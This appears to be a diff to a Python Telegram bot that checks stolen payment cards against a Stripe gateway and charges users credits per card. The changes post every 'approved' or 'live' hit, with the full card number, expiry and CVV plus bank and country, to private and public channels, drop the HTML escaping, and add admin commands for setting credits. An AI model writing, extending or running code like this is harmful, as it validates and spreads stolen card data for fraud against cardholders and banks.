-    """Send hit card to appropriate log channel"""
-    if not is_private:
-        return  # Don't send for public checks
-    
+async def send_to_log_channel(context, card: str, status: str, message: str, username: str, time_taken: float, is_private: bool = False):
+    """Send exact same hit format to channel"""
     try:
-        # Format card for channel
+        # Parse card
         cc, mon, year, cvv = card.split("|")
         cc_clean = cc.replace(" ", "")
+        
+        # Get BIN info
         bin_info = get_bin_info(cc_clean[:6])
         
-        # Escape HTML special characters
-        def escape_html(text):
-            if not text:
-                return ""
-            return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
+        # Determine channel
+        if is_private:
+            channel_id = PRIVATE_LOG_CHANNEL
+            channel_label = "PRIVATE"
+        else:
+            channel_id = APPROVED_LOG_CHANNEL
+            channel_label = "PUBLIC"
         
-        safe_card = escape_html(f"{cc}|{mon}|{year}|{cvv}")
-        safe_bank = escape_html(bin_info['bank'])
-        safe_country = escape_html(bin_info['country'])
+        # Create the EXACT SAME format as user sees
+        result_text = f"""
+[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
+[↯] Status: {status.capitalize()}
+[↯] Response: {message}
+[↯] Gateway: Stripe Auth
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] Bank: {bin_info['bank']}
+[↯] Country: {bin_info['country']} {bin_info['country_flag']}
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] User : @{username or 'N/A'}
+[↯] Made By: @ISHANT_OFFICIAL
+[↯] Bot: @DARKXCODE_STRIPE_BOT
+"""
         
-        if status == "approved" and APPROVED_LOG_CHANNEL:
-            message = f"""<b>✅ APPROVED HIT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Card:</b> <code>{safe_card}</code>
-<b>Bank:</b> {safe_bank}
-<b>Country:</b> {safe_country}
-<b>User:</b> @{username}
-<b>Time:</b> {dt.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━━━━━"""
-            
-            await context.bot.send_message(
-                chat_id=APPROVED_LOG_CHANNEL,
-                text=message,
-                parse_mode=ParseMode.HTML
-            )
-            logger.info(f"Forwarded approved hit to channel: {card}")
-            
-        elif status == "live" and LIVE_LOG_CHANNEL:
-            message = f"""<b>🔥 LIVE HIT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Card:</b> <code>{safe_card}</code>
-<b>Bank:</b> {safe_bank}
-<b>Country:</b> {safe_country}
-<b>User:</b> @{username}
-<b>Time:</b> {dt.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━━━━━"""
-            
-            await context.bot.send_message(
-                chat_id=LIVE_LOG_CHANNEL,
-                text=message,
-                parse_mode=ParseMode.HTML
-            )
-            logger.info(f"Forwarded live hit to channel: {card}")
-            
+        # Send to channel
+        await context.bot.send_message(
+            chat_id=channel_id,
+            text=result_text,
+            parse_mode=ParseMode.HTML
+        )
+        logger.info(f"✓ Forwarded {channel_label} {status} hit to channel")
+        
     except Exception as e:
-        logger.error(f"Error sending to log channel: {e}")
+        logger.error(f"Error sending to channel: {e}")
 
-async def handle_file_upload_message(update: Update,
-                                     context: ContextTypes.DEFAULT_TYPE):
+async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle file upload messages for both public and private checks"""
     if not update.message.document:
         return
@@ -3521,10 +3768,8 @@ async def handle_file_upload_message(update: Update,
         return
 
     try:
-        # Download file using the correct Telegram Bot API method
+        # Download file
         file_obj = await context.bot.get_file(file.file_id)
-        
-        # Download to bytes
         file_bytes = await file_obj.download_as_bytearray()
         file_content = file_bytes.decode('utf-8', errors='ignore')
         
@@ -3560,16 +3805,17 @@ async def handle_file_upload_message(update: Update,
             "timestamp": time.time()
         }
         
-        # Log file upload
-        log_file_upload(user_id, username, file.file_name, len(valid_cards))
-        
         await update.message.reply_text(
             f"✅ File received: `{file.file_name}`\n"
             f"📊 Valid cards: {len(valid_cards)}\n"
             f"🔗 File ID: `{file_id}`\n\n"
-            f"Choose check type:\n"
-            f"• `/mchk` - Private check\n"
-            f"• `/pmchk` - PUBLIC check)",
+            f"*Choose check type:*\n"
+            f"• `/mchk` - PRIVATE check (hits to Private channel)\n"
+            f"• `/pmchk` - PUBLIC check (hits to Public channel)\n\n"
+            f"*Credit Costs Per Card:*\n"
+            f"• ✅ Approved/🔥 Live: 3 credits\n"
+            f"• 🔢 CCN/💳 CVV: 2 credits\n"
+            f"• ❌ Declined: 1 credit",
             parse_mode=ParseMode.MARKDOWN
         )
 
@@ -3841,10 +4087,12 @@ async def main():
 
     # Admin commands
     application.add_handler(CommandHandler("botinfo", botinfo_command))
+    application.add_handler(CommandHandler("setcr", setcr_command))
     application.add_handler(CommandHandler("userinfo", userinfo_command))
     application.add_handler(CommandHandler("addcr", addcr_command))
     application.add_handler(CommandHandler("gengift", gengift_command))
     application.add_handler(CommandHandler("listgifts", listgifts_command))
+    application.add_handler(CommandHandler("testch", test_channels_command))
 
     # ========== MESSAGE HANDLERS ==========
     application.add_handler(
